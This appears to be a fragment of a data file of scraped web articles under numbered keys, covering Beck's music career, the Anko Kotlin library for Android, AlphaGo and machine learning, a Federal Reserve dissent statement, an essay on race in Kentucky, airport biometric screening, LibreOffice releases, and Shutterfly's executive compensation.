was \"impressed by the novelty and freshness of a lot of the ideas\".[104] Beyond his work as a performer, Beck acted as the album's curator, bringing together a diverse collection of artists—including Amon Tobin, Tyondai Braxton, Nosaj Thing, and Memory Tapes—whose work had also been influenced by Glass.[105][106] In December 2012, an interactive iPhone app titled \"Rework_\" was released to complement the album.[107][108]\n\nBeck has contributed three new songs—\"Cities\", \"Touch the People\" and \"Spiral Staircase\"—to the video game Sound Shapes for PlayStation 3, PlayStation 4, and PlayStation Vita.[109] Beck collaborated on two songs for Childish Gambino's \"Royalty\" mixtape in 2012.[110] In 2014, Beck collaborated with Sia for the song \"Moonquake Lake\", which is featured in the soundtrack for the 2014 Annie film.[111]\n\nIn 2015, Beck collaborated with former Fun. frontman Nate Ruess on the single \"What This World Is Coming To\", which was one of the Grammy-winning artist's many works featured on his debut solo album Grand Romantic released in June 2015. He also collaborated with electronic dance music duo The Chemical Brothers on their most recent album Born in the Echoes, providing lead vocals and also credited in writing for the track \"Wide Open\", released in July.[112] In 2016, Beck collaborated with French electronic music band M83, providing vocals for the song \"Time Wind\" from their album Junk. He was also featured on \"Tiny Cities\" by Flume. He also collaborated with Lady Gaga on the song \"Dancin' in Circles\", from her 2016 album Joanne.[113]\n\nIn 2017, Beck appeared in the multi award-winning film The American Epic Sessions, directed by Bernard MacMahon. He recorded \"14 Rivers, 14 Floods\" backed by a full gospel choir, live onto the first electrical sound recording system from the 1920s.[114]\n\nMusical style [ edit ]\n\nBeck's musical style has been considered alternative[115] and indie.[116] He has played many of the instruments in his music himself.[117] Beck has also done some remixes for fellow artists, notably David Bowie and Björk. He has been known to synthesize several musical elements together in his music, including folk, psychedelia, electronic, country, Latin music, hip hop, funk, soul, blues, noise music, jazz, and many types of rock.[118] He has also taken music from Los Angeles as a reference point in his songs.[118]\n\nBeck has an irreverent style of sampling, often using such sources as obscure films to splice together cuts of people talking in the background of his music, or various other found sounds to create sound collages in the background of his music.[citation needed]\n\nPitchfork Media applauded Midnite Vultures, saying, \"Beck wonderfully blends Prince, Talking Heads, Paul's Boutique, 'Shake Your Bon-Bon,' and Mathlete on Midnite Vultures, his most consistent and playful album yet.\" The review continued to comment on Beck, saying that his mix of goofy piety and ambiguous intent helped the album.[119] A Beck song called \"Harry Partch,\" a tribute to the composer and his \"Corporeal\" music, employs Partch's 43-tone scale.[120]\n\nArt career [ edit ]\n\nDuring 1998, Beck's art collaborations with his grandfather Al Hansen were featured in an exhibition titled \"Beck & Al Hansen: Playing With Matches\", which showcased solo and collaborative collage, assemblage, drawing and poetry works.[121] The show toured from the Santa Monica Museum of Art to galleries in New York City and Winnipeg, Manitoba, in Canada. A catalog of the show was published by Plug in Editions/Smart Art Press.[122]\n\nPersonal life [ edit ]\n\nFamily [ edit ]\n\nBeck's nine-year relationship with designer Leigh Limon and their subsequent breakup is said to have inspired his 2002 album, Sea Change.[123] He wrote most of the songs for the album in one week after the breakup.[124] In April 2004, shortly before the birth of their son Cosmo Henri, Beck married actress Marissa Ribisi, who is the twin sister of actor Giovanni Ribisi.[125][126] Their daughter, Tuesday, was born in 2007.[58] On February 15, 2019, Beck filed for divorce from Ribisi after nearly 15 years of marriage.[127]\n\nBeck suffered a spinal injury while filming the music video for 2005's \"E-Pro\". The incident was severe enough to curtail his touring schedule for a few years, but he has since recovered.[69][128]\n\nReligion [ edit ]\n\nBeck has self-identified both as Jewish[9] and as a Scientologist.[129] Beck has been involved in Scientology for most of his life; his wife, Marissa, is also a second-generation Scientologist.[130] Beck publicly acknowledged his affiliation with Scientology for the first time in an interview published in The New York Times Magazine on March 6, 2005. Further confirmation came in an interview with the Irish Sunday Tribune's i Magazine on June 11, 2005, where he was quoted as saying, \"Yeah, I'm a Scientologist. My father has been a Scientologist for about 35 years, so I grew up in and around it.\"\n\nAppearances in media [ edit ]\n\nThe 1986 punk rock musical film Population: 1, starring Tomata du Plenty of The Screamers, features a young Beck in a small nonspeaking role.[131] Beck also appears in Southlander (2001), an American independent film by Steve Hanft and Ross Harris.[132]\n\nBeck has performed on Saturday Night Live seven times. During his 2006 performance in the Hugh Laurie episode, Beck was accompanied by the puppets that had been used onstage during his world tour. He has made two cameo appearances as himself on Saturday Night Live: one in a sketch about medicinal marijuana, and one in a VH1 Behind the Music parody that featured \"Fat Albert & the Junkyard Gang\".[133]\n\nBeck performed a guest voice as himself on Matt Groening's animated show Futurama, in the episode \"Bendin' in the Wind\".[134] He performed in episode 11 of the fourth season of The Larry Sanders Show, in which the producer character Artie (Rip Torn) referred to him as a \"hillbilly from outer space\".[135] He also made a very brief voice appearance in the 1998 cartoon feature film The Rugrats Movie,[136] and guest-starred as himself in a 1997 episode of Space Ghost Coast to Coast titled \"Edelweiss\".[137]\n\nOn January 22, 2010, Beck appeared on The Tonight Show with Conan O'Brien's last show as a backup guitarist for a Will Ferrell–led rendition of Lynyrd Skynyrd's \"Free Bird\" alongside ZZ Top guitarist Billy Gibbons, Ben Harper, and O'Brien himself on guitar.[138][139] On March 1, 2014, Beck was the musical guest on a Saturday Night Live episode hosted by Jim Parsons. Beck also appeared in the 2017 film The Circle, as himself giving a musical performance of the song \"Dreams\".\n\nDiscography [ edit ]\n\nStudio albums [ edit ]\n\nSee also [ edit ]",

  "latent_4535": "We’re excited to announce a library we’ve been working on for Android development, which, among other things allows the creation of Application Interfaces in a type-safe and dynamic way using a DSL.\n\nA Sample Taste\n\nHere is a small example describing some of Anko’s possibilities. Imagine we need to create a simple sign-up form consisting of an EditText for a username and a “Sign up” Button . The code for this, using Anko would be:\n\nimport kotlinx.android.anko.* class MainActivity : Activity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) verticalLayout { padding = dip(16) textView(\"Username:\") { textSize = 18f }.layoutParams { verticalMargin = dip(4) } val login = editText() button(\"Sign up\") { textSize = 20f onClick { login(login.text) } }.layoutParams { topMargin = dip(8) } } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import kotlinx . android . anko . * class MainActivity : Activity ( ) { override fun onCreate ( savedInstanceState : Bundle ? ) { super . onCreate ( savedInstanceState ) verticalLayout { padding = dip ( 16 ) textView ( \"Username:\" ) { textSize = 18f } . layoutParams { verticalMargin = dip ( 4 ) } val login = editText ( ) button ( \"Sign up\" ) { textSize = 20f onClick { login ( login . text ) } } . layoutParams { topMargin = dip ( 8 ) } } } }\n\nAnko makes extensive use of Kotlin’s extension functions and properties arranged into type-safe builders to describe the user interface. In return, we get conciseness and type-safety at compile time.\n\nOf course, we can also see a preview during design time using the Anko Preview plugin, available for both IntelliJ IDEA and Android Studio:\n\nIf we now want to add another text input widget, for instance an email, we could probably create another pair of textView() and editText() function calls. However, a nicer approach would be to extract the corresponding DSL fragment into a new function:\n\noverride fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) verticalLayout { padding = dip(16) val login = inputField(\"Username\") val email = inputField(\"E-mail\") button(\"Sign up\") { textSize = 20f onClick { login(login.text) } }.layoutParams { topMargin = dip(8) } } } fun _LinearLayout.inputField(name: String): TextView { textView(\"$name:\") { textSize = 18f }.layoutParams { verticalMargin = dip(4) } return editText() } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 override fun onCreate ( savedInstanceState : Bundle ? ) { super . onCreate ( savedInstanceState ) verticalLayout { padding = dip ( 16 ) val login = inputField ( \"Username\" ) val email = inputField ( \"E-mail\" ) button ( \"Sign up\" ) { textSize = 20f onClick { login ( login . text ) } } . layoutParams { topMargin = dip ( 8 ) } } } fun _LinearLayout . inputField ( name : String ) : TextView { textView ( \"$name:\" ) { textSize = 18f } . layoutParams { verticalMargin = dip ( 4 ) } return editText ( ) }\n\nAny additional inputs only require a single function call.\n\nEnd result of the form would be:\n\nPartially defined listeners\n\nAnko is very helpful when you are using Android listeners with lots of methods. Consider the following code written that does not use Anko:\n\nseekBar.setOnSeekBarChangeListener(object: OnSeekBarChangeListener { override fun onProgressChanged(seekBar: SeekBar, progress: Int, fromUser: Boolean) { // Something } override fun onStartTrackingTouch(seekBar: SeekBar?) { // Just an empty method } override fun onStopTrackingTouch(seekBar: SeekBar) { // Another empty method } }) 1 2 3 4 5 6 7 8 9 10 11 12 seekBar . setOnSeekBarChangeListener ( object : OnSeekBarChangeListener { override fun onProgressChanged ( seekBar : SeekBar , progress : Int , fromUser : Boolean ) { // Something } override fun onStartTrackingTouch ( seekBar : SeekBar ? ) { // Just an empty method } override fun onStopTrackingTouch ( seekBar : SeekBar ) { // Another empty method } } )\n\nHere’s the version using Anko:\n\nseekBar { onProgressChanged { (seekBar, progress, fromUser) -> // Something } } 1 2 3 4 5 6 seekBar { onProgressChanged { ( seekBar , progress , fromUser ) -> // Something } }\n\nMethods that have empty bodies no longer require, well, empty implementations. Also, if setting onProgressChanged() and onStartTrackingTouch() for the same View, these two “partially defined” listeners will be merged.\n\nMore than a DSL\n\nAnko is not just a DSL but a library which facilitates Android development in different areas. It has many methods covering dialogs, asynchronous tasks, services, intents and even SQLite database access.\n\nFor instance, if you want to start a new Activity :\n\n// Without Anko val intent = Intent(this, javaClass<MyActivity>()) intent.putExtra(\"id\", 5) startActivity(intent) // With Anko startActivity<MyActivity>(\"id\" to 5) 1 2 3 4 5 6 7 8 // Without Anko val intent = Intent ( this , javaClass < MyActivity > ( ) ) intent . putExtra ( \"id\" , 5 ) startActivity ( intent ) // With Anko startActivity < MyActivity > ( \"id\" to 5 )\n\nOr activate vibrator:\n\n// Without Anko val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator vibrator.vibrate(500) // With Anko vibrator.vibrate(500) 1 2 3 4 5 6 7 // Without Anko val vibrator = getSystemService ( Context . VIBRATOR_SERVICE ) as Vibrator vibrator . vibrate ( 500 ) // With Anko vibrator . vibrate ( 500 )\n\nOr even send a toast message:\n\n// Without Anko Toast.makeText(this, \"Download is complete!\", Toast.LENGTH_SHORT).show() // With Anko toast(\"Download is complete!\") 1 2 3 4 5 6 // Without Anko Toast . makeText ( this , \"Download is complete!\" , Toast . LENGTH_SHORT ) . show ( ) // With Anko toast ( \"Download is complete!\" )\n\nExisting code support\n\nYou can keep your old classes written in Java. Moreover, if you still want (or have) to write a Kotlin activity class and inflate an XML layout for some reason, you can use View properties and listener helpers which would make things easier:\n\nname.hint = \"Enter your name\" name.onClick { /* do something */ } 1 2 3 name . hint = \"Enter your name\" name . onClick { /* do something */ }\n\nBenefits of Anko\n\nHopefully you can see that Anko offers a series of benefits, in particular:\n\nEverything is in one place . Instead of splitting layouts into static (XML) and dynamic parts and then trying to tie them together, we can just write everything we want using Kotlin. Compile-time type checking is a sweet bonus.\n\n. Instead of splitting layouts into static (XML) and dynamic parts and then trying to tie them together, we can just write everything we want using Kotlin. is a sweet bonus. Anko can make our code more concise and readable .\n\n. It allows for easy re-use. We can just extract a part of the DSL into a function and use it multiple times.\n\nGive it a try!\n\nAnko is still in alpha stage but we want to release early to get your feedback, so please give it a try. We’ve made it as simple as possible to do so.

  "latent_4558": "Last week, machine learning took a big leap forward when Google’s AlphaGo, a machine algorithm, beat the world champion, Lee Sedol, in the game Go. An ancient Chinese board game that dates back nearly 3,000 years, Go is played on a 19-by-19 square grid, with each player trying capture the opponent’s territory. Unlike Western chess that has around 40 turns in a game, Go can go up to 200. The number of possible outcomes quickly compounds to a bewildering range of 10,761 — more than the total number of atoms in the entire observable universe. It was thought it would take at least another 10 years before a machine could beat a human in Go.\n\nWhat’s most remarkable is that AlphaGo turns out to be a machine that can improve its performance every day, without the direct supervision of a human programmer. That’s like an aircraft that can fly faster and faster without the help of an engineer. How can that be possible?\n\nThe past, present and future of machine learning\n\nStructured data. When machine learning first took off, it was used to predict how we click, buy, lie, or die. Machines improved the way companies email, call, offer a discount, recommend a product, show an ad, inspect flaws, and approve loans. Under the hood of machine learning is statistical data mining that uncovers previously unknown patterns and recommends real-time actions. The downside to this approach is that it is context dependent. This is why most algorithms were built for a single purpose, like Deep Blue, which beat former chess grandmaster Garry Kasparov, but wasn’t useful for anything else. For these first-generation machines, learning was made possible only through constant monitoring by computer scientists and statisticians. Data had to be labeled, and goals set. The same program design couldn’t be used for different problems, and the algorithm couldn’t understand unstructured data expressed in natural human language.\n\nNatural languages. When IBM Watson beat former champions Ken Jennings and Brad Rutter in the game show Jeopardy! in February 2011, it became clear that machine learning could go beyond this single-minded focus and handle unstructured, ambiguous data. In addition to factual knowledge on a wide variety of topics, competing on Jeopardy! requires the ability to understand subtle meaning, irony, riddles, slang, metaphors, jokes, puns, and other language complexities. Meaning is dependent on what has been said before, the topic itself, and how it is being discussed. At the end of the two-day Jeopardy! tournament, Watson amassed $77,147 in prize money, more than three times that of its human opponents. Jennings, who came in second, later said, “Just as factory jobs were eliminated in the 20th century by new assembly line robots, Brad and I were the first knowledge-industry workers put out of work by the new generation of ‘thinking’ machines.”\n\nCurrently, rather than replacing experts, Watson enhances their work. For example, the algorithm provides research and clinical recommendations to oncologists, who only need to describe a patient’s symptoms to Watson in plainspoken English, via an iPad application. Even though it doesn’t rely on encoded rules, IBM Watson requires close monitoring by domain experts to provide data and evaluate its performance. Before Watson went live for oncologists, it had been manually fed 25,000 test-case scenarios; 1,500 real-life cases; 605,000 pieces of medical evidence; and 2 million pages of text. Nurses had spent more than 14,700 hours meticulously training the algorithm. All this took time, money, and dedication.\n\nDeep learning. Before AlphaGo played against a human, Google researchers had been developing it to play video games — Space Invaders, Breakout, Pong, and others. AlphaGo was programmed to seek positive rewards in the form of scores and continually improve its system by playing millions of games against tweaked versions of itself. The algorithm was able to master each game by trial and error — pressing different buttons randomly at first, then figuring out an appropriate strategy and applying it without making any mistakes. AlphaGo achieved this because it is based on a deep neural network — a network of hardware and software that mimics the web of neurons in the human brain. This idea is not new; it has been discussed among computer scientists for more than 20 years. But due to the advance of computing power, deep learning has become practical, and AlphaGo was the first to achieve such a stunning mimicry of intuitive thinking.\n\nThe impact on big companies\n\nAlphaGo proves that the rise of machines capable of learning with minimum supervision from human experts and programmers is inevitable. And as IBM Watson has shown, machines will also absorb large amount of information and data in any format, structured or not, across a wide array of sources. The cost of implementation will continue to fall. The coordination of business transactions within and outside an organization will speed up, and in the process, eliminate organizational friction and facilitate market collaboration.\n\nFor these reasons, big companies with the conventional advantage of being vertically integrated will be the first to go. Traditional propositions like “one-stop shop” or “supply chain optimization” will become commonplace, easily achievable by small players or new entrants in a number of industries.\n\nConsider Electronic Data Interchange (EDI) and other large-scale inter-organizational systems that enable real-time communication with suppliers, customers, and logistics specialists. Systems made by SAP and Oracle are bulky, expensive, difficult to use, and hard to integrate. Historically, only big firms such as Walmart or Best Buy have had enough sway, and bargaining power, to force their suppliers to adopt them. Once put in place, these systems still require a bastion of specialists to constantly monitor, tweak, and recommend managerial actions as well as cascade them throughout an organization.\n\nIn contrast, the team that developed AlphaGo had fewer than 50 people. The program itself is relatively lightweight, requires little human intervention once set up, and is deployable across different problem domains.\n\nIt is easy to imagine a world where self-taught algorithms will play a much bigger role in coordinating economic transactions; AlphaGo simply shows us what is possible in the near future. With instantaneous adjustment, automatic optimization, and continuous improvement all quietly managed by unsupervised algorithms, the redundancy of production facilities and wastage in the supply chain should become headaches of the past. Freed from the pressure to vertically integrate and with far fewer resources needed for organizational coordination, smaller players will be able to specialize in best-in-class services and deliver extremely customized solutions in real time when specific demands arise.\n\nThe questions looming for large, nontech companies are: 1) What are the core competencies of my organization when size no longer matters? 2) How much of my organization’s managerial expertise is entirely dedicated to market coordination? 3) If new competitors replicate these capabilities by replacing human experts with machine algorithms, what is my cost structure compared to theirs? 4) Going forward, what new offering can I extend if product distribution is democratized? 5) Can I partner with new players to recombine my current capabilities to enter new markets?\n\nMost exciting to me is the even larger prospect of embedding AlphaGo-like machine learning into the backbone of the global economy. When algorithms that never stop learning link loosely related companies, NGOs, and government agencies, they may enable the emergence of new ecosystems that tackle the most difficult societal problems — those currently fumbled by the complexity and fragmentation of players in the field — like energy, transportation, health care, and education.",

  "latent_4652": "Sept. 19, 2015 Richmond Fed President Jeffrey Lacker Comments on FOMC Dissent Richmond, Va.\n\n“The Federal Open Market Committee (FOMC) decided on September 17, 2015, to maintain a target range of zero to 25 basis points for the federal funds rate.\n\n“I dissented because I believe that an increase in our interest rate target is needed, given current economic conditions and the medium-term outlook. Household spending, which has grown steadily since the recession, has accelerated in the last couple of years. Labor market conditions have steadily improved as well and have tightened considerably this year. With the federal funds rate near zero and inflation running between 1 and 2 percent, real (inflation-adjusted) short-term interest rates are below negative 1 percent. Such exceptionally low real interest rates are unlikely to be appropriate for an economy with persistently strong consumption growth and tightening labor markets.\n\n“Inflation has run somewhat below the Committee’s 2 percent objective in recent years and was held down late last year by declining oil prices and appreciation of the dollar. Since January, however, inflation has been very close to 2 percent. Movements in oil prices and the value of the dollar in recent weeks have renewed downward pressure on inflation. As with last year’s episode, this disinflationary impulse is likely to be transitory. So I remain confident that inflation will move back to the FOMC’s 2 percent objective over the medium term.\n\n“A higher interest rate under current conditions is also consistent with the way the FOMC has responded to economic conditions and inflation over the last few decades. This historical pattern of behavior has conditioned public beliefs about how the FOMC is likely to behave in the future, and it has been an essential foundation for the monetary stability we currently enjoy. Further delay would be a departure from a pattern of behavior that has served us well in the past. The historical record strongly suggests that such departures are risky and raise the likelihood of adverse outcomes.\n\n“For these reasons, I supported raising the target range for the federal funds rate by 25 basis points at this meeting. Interest rates have been near zero for over six years. Even after a quarter-point increase, interest rates would remain exceptionally low, providing ample support for economic growth. This expansion has been disappointing by some measures, when compared to historical averages. Nevertheless, U.S. economic conditions have improved quite significantly over the last six years, all things considered. It’s time to recognize the substantial progress that has been achieved and align rates accordingly.\n\n“I recently expressed my views in a speech to the Richmond Retail Merchants Association titled The Case Against Further Delay. My views on the economy and monetary policy are also available on richmondfed.org.”\n\nAs part of our nation’s central bank, the Richmond Fed is one of 12 regional Reserve Banks working together with the Board of Governors to support a healthy economy and deliver on our mission to foster economic stability and strength. We connect with community and business leaders across the Fifth Federal Reserve District—including the Carolinas, District of Columbia, Maryland, Virginia, and most of West Virginia—to monitor economic conditions, address issues facing our communities, and share this information with monetary and financial policymakers. We also work with banks to ensure they are operating safely and soundly, supply financial institutions with currency that’s fit for distribution, and provide a safe and efficient way to transfer funds through our nation’s payments system.\n\n###",
  "latent_4679": "I am thinking of Cecil Horton this Dr. Martin Luther King Jr. holiday.\n\nI haven’t seen Cecil since high school. He probably wouldn’t remember me.\n\nWe were in the seventh grade when Cecil, who is African American, taught me there can be a big difference between preached and practiced Christianity, especially when it comes to race. Sadly, I have learned that lesson many times since.\n\nI was a skinny, decidedly unworldly white kid when I met Cecil.\n\nI turned 61 last month. I have lived all of my life in Kentucky, all but a few months of it in Mayfield, deep in the western part of the Bluegrass State.\n\nThough a border state, Kentucky was part of the Jim Crow South. Segregation was still the law and the social order when I was a kid.\n\nI grew up in an all-white neighborhood. I went to an all-white grade school. Parks, playgrounds, restaurants, motels, public toilets, movie houses, churches and even cemeteries were segregated. So was everything else in town.\n\nAfrican Americans were restricted to certain sections of Mayfield. I won’t repeat the ugly epithet a lot of white people collectively called the black neighborhoods.\n\nUntil I met Cecil, I can only remember one time I ever even talked to an African American my age, or about my age. I was about 10, maybe 9. Anyway, he was the son of the man who picked up our trash in a mule-drawn wagon that rolled on old car tires. The kid came with his father one day.\n\nWe played together in my back yard under our little cherry tree. I showed him my new toy Bell Telephone truck. It was painted olive-green, about the same shade as the army uniforms some of the dads on my street brought home from World War II.(My dad was a sailor.)\n\nWe had fun, not as a white kid and a black kid, but as kids, period. I never saw the kid again. I returned to my white pals and forgot him.\n\nThe local schools weren’t desegregated until I was in the seventh grade. That’s when I met Cecil.\n\nWhen one kid meets another kid, one of the first questions that gets asked is, “Where does your daddy work?”\n\nCecil asked me first.\n\n“My daddy works at General Tire,” I replied. I meant the big tire factory north of town that Continental Tire of Germany eventually bought out and shut down, busting the union and moving production to cheap labor countries overseas.\n\n“Where does your daddy work?” I asked Cecil.\n\n“My daddy is a Presbyterian preacher,” he said.\n\n“Where?” I asked.\n\n“Right here in Mayfield,” he replied.\n\nI thought he was pulling my leg. He wasn’t.\n\nI was dumbfounded. I grew up in Mayfield First Presbyterian Church. I had never heard of any other Presbyterian church in town. The only black faces I ever saw in my church belonged to the middle-aged janitor who later became our trash collector and to the elderly woman who kept the kids in the nursery.\n\nI was taught in Sunday school that Jesus loved us all the same and that we were all God’s children. It seemed pretty standard stuff. I never thought about it until I met Cecil.\n\nI was an indifferent student all through high school, given to reading car magazines, not pondering weighty matters like racism. But even I wondered why, if we’re all God’s children, we didn’t worship together. Were Presbyterians like Cecil and his daddy not welcome in our church?\n\nMy town — and many more like it across the South and in border states like Kentucky — was deeply divided by the color bar. I didn’t see it because it didn’t affect me. Before meeting Cecil Horton, black people were invisible to me, as in the title of Ralph Ellison’s famous novel.\n\nI am grateful to Cecil for first making me aware of racial prejudice. It was my first Road to Damascus experience about race relations in the country that is supposed to stand for “…liberty and justice for all,” as the last line in the Pledge of Allegiance says.\n\nWhen I was a kid, the enemies of “…liberty and justice for all” were the communists in Russia and Red China. “It is often easier to become outraged by injustice half a world away than by oppression and discrimination half a block from home,” wrote Carl T. Rowan, the late syndicated newspaper columnist.\n\nI was reminded of what Cecil said in 1963, when I was a high school freshman. King, a Baptist pastor who was leading the civil rights movement, observed that “…the church is still the most segregated major institution in America. At 11:00 on Sunday morning when we stand and sing and Christ has no east or west, we stand at the most segregated hour in this nation. This is tragic.”\n\nIndeed it was, and still is. And for the record: traditionally African American churches never barred white folks. St. James AME in Mayfield had a white preacher a few years ago.\n\nAnyway, King’s “the most segregated hour” speech still reminds me of the Jesus print at my church. A lot of white churches probably had one like it. Many probably still do. Jesus had brown hair, a medium white complexion and, if memory serves, green or at least hazel eyes. He looked like us.\n\nYears later, I thought of the Jesus picture when I ran across a quote from Robert G. Ingersoll, the “Great Agnostic” of the 19th century — and a Republican party bigwig: “Each nation has created a god, and the god has always resembled his creators. He hated and loved what they hated and loved, and he was invariably found on the side of those in power.”\n\nTimes have changed for the better in my hometown, in my neighborhood — I live with my wife and our son next door to where I grew up — and in my church. Jim Crow is long gone, thank the Good Lord. African Americans and Hispanics live up and down our street.\n\nA handful of African Americans go to First Presbyterian. I have faith that other blacks would be welcome.\n\nWhile we’ve come far in Mayfield and in the whole country, we’ve got far to go. Many whites still don’t want people of color coming to their churches. Racism is down, but not out.\n\nAnyway, in perhaps his most famous speech, King dreamed “…that my four little children will one day live in a nation where they will not be judged by the color of their skin, but by the content of their character” and “…that one day on the red hills of Georgia the sons of former slaves and the sons of former slave owners will be able to sit down together at a table of brotherhood.”\n\nOur son grew up in the hills of western Kentucky with white kids, African American kids, Asian kids and Hispanic kids. They come to our house; he goes to theirs.\n\nI didn’t give any thought to race when I was a kid because I lived in a lily-white world. Berry IV doesn’t give any thought to race either, but for exactly opposite reason: his world isn’t lily white.\n\nThank you, Dr. King and thank you, too, Cecil Horton.\n\nBerry Craig\n\nAuthor Spotlight: Berry Craig",
  "latent_4754": "I’ve been hearing some ads lately on sports talk for the Fly Clear program, which allows you to speed through airport security. Seductive message, that – those security lines are a bitch, even now that the TSA has apparently concluded that I’m not a terrorist. It would damned sure be nice to be able to scoot through a special line and be on my way, especially when I’m running late.\n\nOf course, it’s not an uncomplicated issue, is it? These days convenience comes at a price, and the price here is almost certainly even more loss of privacy. So let’s see – how does this work? Ah, here it is, in Step 2:\n\nA Clear attendant will verify two pieces of approved government-issued identification, capture images of your irises and fingerprints, and take your photograph.\n\nThey want my biometrics. A retinal scan. How very Minority Report.\n\nUp until a few months ago I’d never even been fingerprinted, but now the state of Colorado requires that everybody be printed when they get their driver’s licenses. I sat there and contemplated walking out – I tried to figure out how to end-run the system, but I couldn’t come up with anything. So now I’m in the system, no doubt searchable by every official agency in the world. I try not to be unduly paranoid, but I tend not to trust large organizations, governmental, corporate or otherwise.\n\nInk-stained fingers crossed, I guess.\n\nBut this really isn’t the worst of it, by far. The fact is that this system not only asks us to trade privacy for convenience, it also opens the door to potential security breaches. I’m no expert on the subject, but Bruce Schneier damned sure is, and what he has to say is instructive.\n\nBackground checks are based on the dangerous myth that we can somehow pick terrorists out of a crowd if we could identify everyone. Unfortunately, there isnâ€™t any terrorist profile that prescreening can uncover. Timothy McVeigh could probably have gotten one of these cards. So could have Eric Rudolph, the pipe bomber at the 1996 Olympic Games in Atlanta. There isnâ€™t even a good list of known terrorists to check people against; the government list used by the airlines has been the butt of jokes for years. And have we forgotten how prevalent identity theft is these days? If you think having a criminal impersonating you to your bank is bad, wait until they start impersonating you to the Transportation Security Administration. The truth is that whenever you create two paths through security — a high-security path and a low-security path — you have to assume that the bad guys will find a way to exploit the low-security path. It may be counterintuitive, but we are all safer if the people chosen for more thorough screening are truly random and not based on an error-filled database or a cursory background check. I think of Clear as a $100 service that tells terrorists if the F.B.I. is on to them or not.

  "latent_4931": "On the heels of announcing new versions 5.2 and 5.1.5 of the free, LibreOffice suite of productivity applications, The Document Foundation has provided statistics indicating that LibreOffice is gaining traction with Linux users, developers, administrators, and enterprises. In fact, the new version 5.1.5 of the suite is specifically tuned for enterprise users.\n\nThe Document Foundation’s Annual Report notes that the LibreOffice project now has more than 1,000 contributors with 300 making commits in 2015. Moreover, new releases of the suite include enhanced focus on compatibility and standards. The suite’s import/export filters have improved exponentially, and — in a move that will appeal to many admins and cloud-minded users — the suite has been steadily adding direct integration with platforms and services including Google Drive, SharePoint, and Alfresco. You can now open files directly from — and save files to — these services via menu choices under the File menu in LibreOffice applications.\n\nIntegration with these platforms and services, of course, means that LibreOffice is now much more competitive with Google Docs. Additionally, as security concerns remain on everyone’s radar, The Document Foundation is working closely with the Transglobal Secure Collaboration Program (TSCP), a public-private partnership formed to secure electronic communication for organizations including defense contractors and government entities. The TSCP has specifications and frameworks that preserve more secure shared documents online. LibreOffice 5.2 complies with these document classification specifications.\n\nIn LibreOffice 5.2, documents can be classified into categories (e.g., \"Confidential\") according to TSCP standards. Additionally, multiple digital signatures and descriptions are now supported, along with import and export of signatures from OOXML files.\n\nThe Ubuntu Connection\n\nLibreOffice is, of course, familiar to many Linux users, especially Ubuntu users. After all, the suite has been the default office suite of the Ubuntu OS for years, and it runs fluidly on Ubuntu tablets as well. And, Ubuntu is among the most popular platforms on which to build OpenStack deployments. On the Ubuntu front, The Document Foundation has also recently announced that Canonical, Ubuntu’s parent, has joined its Advisory Board.\n\nThe Document Foundation recently clarified that LibreOffice is now on a six-month cycle for major releases, to keep it in step with other open source projects, including OpenStack and Ubuntu. Canonical’s participation on The Documents Foundation’s Advisory Board will help inform and enforce this release schedule.\n\nOf course, LibreOffice, like Google Docs, takes criticism on some fronts for not being fully compatible with Microsoft Office formats and standards. In fact, you can find lively debates on this topic online. The new releases, though, are much more compatible with them. For example, changes to the formula engine within LibreOffice’s Calc spreadsheet app remove restrictions on table structure references in cells. The upshot of this is that the spreadsheet application has better interoperability with other applications, especially Microsoft Excel.\n\nIn what could be a very critical next step in encouraging more adoption of LibreOffice, The Document Foundation is developing mobile versions of the LibreOffice applications for Android and Apple iOS devices. These will extend well beyond the limited, document “viewer” applications that you can get now. The full-featured mobile versions will likely integrate directly with popular cloud services, giving users full access to documents and content on the go.\n\nIn significant ways, LibreOffice is emerging as a viable competitor to both Microsoft’s productivity application suite and Google Docs. It’s also gaining traction in some notable global organizations. For example, a huge branch of the Italian government has switched from Microsoft Office to LibreOffice, and the UK government has made similar moves.",

  "latent_5161": "Cimpress’ board of directors faced a dilemma similar to that currently faced by Shutterfly: shareholder desire for the compensation program to be significantly revamped. During 2012, in response to shareholder sentiment, Cimpress developed a revised executive compensation plan with the long-term incentive component being a performance option package priced at a premium that vested over seven years and required a dramatic increase in the stock price (well above the exercise price) for the CEO to exercise options. Further, Cimpress’ board prohibited additional long term equity grants/options for a minimum period of four years after the plan was implemented.\n\nA contrast of the Cimpress plan to Jeff Housenbold’s 2015 long-term incentive compensation exemplifies the lack of alignment of management and long term shareholders. 45% of Mr. Housenbold’s long-term incentive comp is purely time-based and has no correlation with shareholder value. The remaining 55% is performance based and paid out annually over a three-year vesting schedule, with a trigger event (adjusted EBITDA of $185 million) that equates to less than 11% adjusted EBITDA growth in 2015. Even more problematic is the fact that the board has no restriction on issuing subsequent restricted stock grants. As a result, Jeff Housenbold could earn far more than the annual amounts detailed above without having enhanced shareholder value.\n\nShutterfly’s board clearly believes Mr. Housenbold’s leadership is inherent to the Company’s success. However, by continually throwing annual stock grants at him and failing to align his compensation with the interests of the majority of shareholders, they make it easier for him to leave should he choose to do so. We believe a program similar to the one at Cimpress would require that Mr. Housenbold think like a shareholder to get paid and would prevent him from holding other inbound offers over the board’s head every year when they are determining his compensation package.\n\nIt is also worth noting that from 2010-2014 the Company repurchased approximately $125 million of stock, while over the same period, Mr. Housenbold sold approximately $99 million of stock. In other words, the Company has effectively cashed out the CEO nearly 80 cents for every dollar expended on stock repurchases, exemplifying the lack of strong alignment of interests between management and shareholders.\n\nFree cash flow (FCF) definition fails to account for excessive stock compensation\n\nWhile we believe the bulk of the shareholder conversation with the board should focus on a more dramatic overhaul to the executive compensation plan as laid out above, we believe the definition of FCF in the Company’s current plan is problematic.\n\nIn the October 2014 opinion of the Ancestry.com appraisal rights case (which dealt specifically with the impact of stock based compensation on determining value), Vice Chancellor Glasscock, who presided over the case, concluded:\n\n“What is clear to me is that, once it reaches a material level, SBC (stock-based compensation) must in some manner be accounted for in order to reach a reasonable calculation of fair value”\n\nHe goes on to adopt accounting for stock-based compensation as a cash expense, the approach he finds “reasonable.”\n\nShutterfly’s definition of free cash flow, adjusted EBITDA less purchases of property and equipment and capitalization of software and website development costs, fails to account for both stock based compensation and cash paid for acquisitions, another potential drag on value delivered to 